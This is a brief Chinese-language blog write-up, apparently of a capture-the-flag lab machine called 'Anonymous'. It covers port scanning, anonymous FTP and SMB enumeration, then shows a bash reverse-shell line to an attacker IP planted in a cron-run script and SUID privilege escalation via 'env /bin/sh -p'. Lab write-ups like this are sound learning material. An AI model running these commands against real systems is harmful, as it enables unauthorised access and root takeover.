---
weight: 999
title: "Anonymous"
description: ""
icon: "article"
date: "2025-06-08T15:14:30+08:00"
lastmod: "2025-06-08T15:14:30+08:00"
draft: false
toc: true
---

根据题目先扫端口
```
sudo nmap -p 1-5000 -sV -O -v 10.10.121.117
```
![](https://gitee.com/inklong/blog-pic/raw/master/images/20250608151610245.png)

能看见有ftp，ssh和smb

接着连接ftp
```shell
ftp 10.10.121.117
Anonymous
```
连接成功，找到三个文件，有一个sh文件

接着枚举smb
```shell
smbclient -L \\\\10.10.121.117
```
![](https://gitee.com/inklong/blog-pic/raw/master/images/20250608151610239.png)

有共享文件夹pic，访问
```shell
smbclient \\\\10.10.121.117\pics
```
只有图片

返回ftp，修改sh文件，弹shell
```sh
bash -i >& /dev/tcp/10.8.43.78/11451 0>&1
```
上传
```shell
append clean.sh
```
等待计划任务执行获得shell

之后提权，上传linpeas或者找suid都行
```shell
find / -perm -u=s -type f 2>/dev/null
```

两个都能发现env
```shell
env /bin/sh -p
```

提权成功
